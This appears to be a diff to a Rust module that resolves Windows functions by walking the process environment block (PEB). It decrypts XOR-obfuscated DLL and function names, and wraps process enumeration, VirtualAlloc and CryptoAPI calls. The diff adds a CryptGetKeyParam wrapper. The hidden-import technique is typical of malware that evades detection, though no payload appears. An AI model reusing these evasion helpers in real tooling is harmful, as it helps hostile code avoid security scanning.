@@ -1,4 +1,5 @@
 #![allow(non_snake_case)]
+#![allow(unused)]
 
 use crate::consts::*;
 use crate::crypto_util::*;
@@ -30,7 +31,7 @@ pub unsafe fn get_peb() -> *const PEB {
 }
 
 pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
-    let mut peb = get_peb();
+    let peb = get_peb();
 
     if sModuleName.is_empty() {
         return (*peb).ImageBaseAddress;
@@ -89,7 +90,7 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
 
     let mut pProcAddr = 0;
 
-    let sOrdinalTest = (*(sProcName.as_ptr() as *const u32));
+    let sOrdinalTest = *(sProcName.as_ptr() as *const u32);
     if sOrdinalTest >> 16 == 0 {
         let ordinal = (*(sProcName.as_ptr() as *const u16)) as u32;
         let Base = (*pExportDirAddr).Base;
@@ -201,7 +202,6 @@ pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool
 }
 
 pub unsafe fn VirtualAlloc(
-    hProcess: usize,
     lpAddress: usize,
     dwSize: usize,
     flAllocationType: u32,
@@ -416,6 +416,30 @@ pub unsafe fn CryptSetKeyParam(hKey: usize, dwParam: u32, pbData: *const u8, dwF
     ));
 
     cryptSetKeyParam(hKey, dwParam, pbData, dwFlags)
+}
+
+pub unsafe fn CryptGetKeyParam(
+    hKey: usize,
+    dwParam: u32,
+    pbData: *mut u8,
+    pbDataLen: *mut u32,
+    dwFlags: u32,
+) -> bool {
+    let cryptGetKeyParam: CryptGetKeyParam = std::mem::transmute(GetProcAddress(
+        GetModuleHandle(get_xor_encrypted_string(
+            ADVAPI32_DLL_POS,
+            ADVAPI32_DLL_KEY,
+            ADVAPI32_DLL_LEN,
+        )),
+        get_xor_encrypted_string(
+            CRYPTGETKEYPARAM_POS,
+            CRYPTGETKEYPARAM_KEY,
+            CRYPTGETKEYPARAM_LEN,
+        )
+        .as_slice(),
+    ));
+
+    cryptGetKeyParam(hKey, dwParam, pbData, pbDataLen, dwFlags)
 }
 
 pub unsafe fn CryptDecrypt(
